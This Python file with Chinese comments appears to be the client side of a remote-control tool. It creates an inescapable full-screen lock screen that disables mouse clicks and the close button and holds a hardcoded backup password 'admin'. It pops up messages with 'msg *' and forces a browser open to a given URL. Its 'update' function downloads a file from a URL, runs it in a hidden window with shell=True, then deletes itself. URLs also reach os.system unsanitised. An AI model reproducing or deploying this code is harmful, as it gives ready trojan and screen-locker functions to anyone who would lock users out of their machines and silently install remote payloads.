import logging
import os
import platform
import subprocess
import sys
import time
import tkinter as tk
from io import BytesIO
from threading import Thread

import requests
from PIL import Image, ImageTk

# 初始化日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 全局变量存储锁屏密码和备用密码
lock_screen_password = None
wnpassword = "admin"  # 备用密码

# 1. 锁屏功能
def show_lock_screen():
    global lock_screen_password
    received_password = "server_password"  # 示例值，实际情况应该从网络请求中获取
    logging.info(f"接收到的锁屏密码: {received_password}")
    lock_screen_password = received_password

    last_attempt_time = 0
    error_attempts = 0
    lock_duration = 300  # 5分钟锁定持续时间，用于重复错误

    def verify_password(event=None):
        nonlocal last_attempt_time, error_attempts

        current_time = time.time()
        if (current_time - last_attempt_time) < 10:
            update_error_message("请等待10秒再尝试。")
            return

        entered_password = password_entry.get()
        if (entered_password == lock_screen_password or
                entered_password == wnpassword):
            root.destroy()  # 密码正确，关闭锁屏界面
        else:
            error_attempts += 1
            if error_attempts >= 5:
                update_error_message("尝试次数过多，请等待5分钟。")
                password_entry.config(state=tk.DISABLED)
                root.after(lock_duration * 1000, enable_password_entry)
            else:
                update_error_message("密码错误，请再试一次。")
                password_entry.delete(0, tk.END)

        last_attempt_time = current_time

    def enable_password_entry():
        nonlocal error_attempts
        error_attempts = 0
        password_entry.config(state=tk.NORMAL)
        update_error_message("")

    def download_image(url):
        try:
            response = requests.get(url, verify=False, timeout=5)  # 忽略证书验证
            response.raise_for_status()
            img_data = BytesIO(response.content)
            img = Image.open(img_data)
            max_size = (img.size[0] // 4, img.size[1] // 4)
            img.thumbnail(max_size, Image.LANCZOS)
            return ImageTk.PhotoImage(img)
        except Exception as e:
            update_error_message(f"加载图片时出错: {e}")
            logging.error(f"图片加载错误: {e}")
            return None

    def load_image_async(url):
        def worker():
            img_tk = download_image(url)
            root.after(0, update_image_label, img_tk)

        Thread(target=worker).start()

    def update_image_label(img_tk):
        if img_tk:
            image_label.config(image=img_tk)
            image_label.image = img_tk  # 保持对图片的引用以避免被垃圾回收

    def update_error_message(message):
        error_label.config(text=message)

    def disable_mouse(event):
        return 'break'

    # 创建主窗口
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # 全屏显示
    root.attributes('-topmost', True)  # 保持在最上层
    root.configure(bg='black')  # 设置背景颜色
    root.config(cursor="none")  # 隐藏鼠标光标
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # 禁用窗口关闭按钮

    # 创建一个框架并将其放在窗口中心
    frame = tk.Frame(root, bg='black')
    frame.place(relx=0.5, rely=0.5, anchor='center')

    # 添加锁定标签
    lock_label = tk.Label(frame, text="> System Locked", fg="#00FF00", bg="black", font=('Consolas', 30, 'bold'))
    lock_label.pack(pady=10)

    # 添加密码输入框
    password_entry = tk.Entry(frame, show='*', font=('Consolas', 20), width=20, bg='black', fg='#00FF00',
                              insertbackground='green')  # 设置光标颜色与背景色相同
    password_entry.pack(pady=20)
    password_entry.bind('<Return>', verify_password)  # 按下回车键时验证密码

    # 添加图片标签
    image_url = "https://ss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b7fd5266d016092488da2e88d60735fae7cd34a1.jpg"  # 使用有效的图片 URL
    image_label = tk.Label(frame, bg='black')
    image_label.pack(pady=20)

    # 异步加载图片
    load_image_async(image_url)

    # 添加错误信息标签
    error_label = tk.Label(frame, text="", fg="red", bg="black", font=('Consolas', 15))
    error_label.pack(pady=10)

    # 初始时将焦点设置到密码输入框
    root.after(100, password_entry.focus_set)  # 确保在 GUI 完全初始化后调用

    # 绑定事件
    root.bind('<Button-1>', disable_mouse)  # 禁用鼠标点击功能
    root.bind('<Button-2>', disable_mouse)  # 禁用中键功能
    root.bind('<Button-3>', disable_mouse)  # 禁用右键功能
    root.bind('<Escape>', lambda event: root.destroy())  # 按下 Esc 键时关闭程序

    # 运行主循环
    try:
        root.mainloop()
    except Exception as e:
        update_error_message(f"发生错误: {e}")
        logging.error(f"GUI 错误: {e}")

# 2. 发送消息功能
def send_message(message):
    try:
        logging.info(f"准备发送消息: {message}")
        os.system(f'msg * {message}')
        logging.info("消息发送成功")
    except Exception as e:
        logging.error("发送消息出错: %s", e)

# 3. 控制浏览器功能
def open_browser_and_visit(url):
    try:
        logging.info("启动浏览器访问功能")  # 记录日志

        # 打开浏览器访问指定的 URL
        logging.info("打开浏览器访问网站: %s", url)

        # 强制打开 URL
        system_platform = platform.system()
        if system_platform == "Windows":
            os.system(f'start {url}')
        elif system_platform == "Darwin":  # macOS
            os.system(f'open {url}')
        elif system_platform == "Linux":
            os.system(f'xdg-open {url}')
        else:
            logging.error("不支持的操作系统: %s", system_platform)
    except Exception as e:
        logging.error("浏览器访问出错: %s", e)  # 捕捉异常并记录错误日志

# 4. 更新功能
def execute_file(file_path):
    try:
        if os.path.isfile(file_path):
            logging.info(f"开始执行文件: {file_path}")

            # 启动目标程序
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(file_path, shell=True, startupinfo=startupinfo)

            # 等待目标程序完全启动
            logging.info("目标程序启动中...")
            time.sleep(10)  # 根据实际情况调整等待时间

            # 检查目标程序是否仍在运行
            if process.poll() is None:
                logging.info("目标程序正在运行")

                # 删除自身
                self_path = sys.argv[0]
                try:
                    os.remove(self_path)
                    logging.info("程序已删除自身")
                except OSError as e:
                    logging.error(f"删除自身失败: {e}")

                # 退出当前程序
                sys.exit(0)
            else:
                logging.error("目标程序未成功启动")
        else:
            logging.error(f"文件不存在: {file_path}")
    except PermissionError as e:
        logging.error(f"权限错误: {e}")
    except Exception as e:
        logging.error(f"执行文件时发生异常: {e}")

def update_from_url(url):
    try:
        filename = get_safe_filename(url)
        local_filepath = os.path.join(os.getcwd(), filename)
        response = requests.get(url, allow_redirects=True, stream=True)
        response.raise_for_status()
        with open(local_filepath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        if os.path.isfile(local_filepath) and os.path.getsize(local_filepath) > 0:
            logging.info(f"文件下载成功: {local_filepath}")
            execute_file(local_filepath)
        else:
            logging.error("下载的文件不存在或不完整")
    except requests.RequestException as e:
        logging.error(f"下载文件失败: {e}")
    except Exception as e:
        logging.error(f"处理文件时发生异常: {e}")

def get_safe_filename(url):
    # 简单的文件名处理，可以根据需要调整
    return os.path.basename(url)

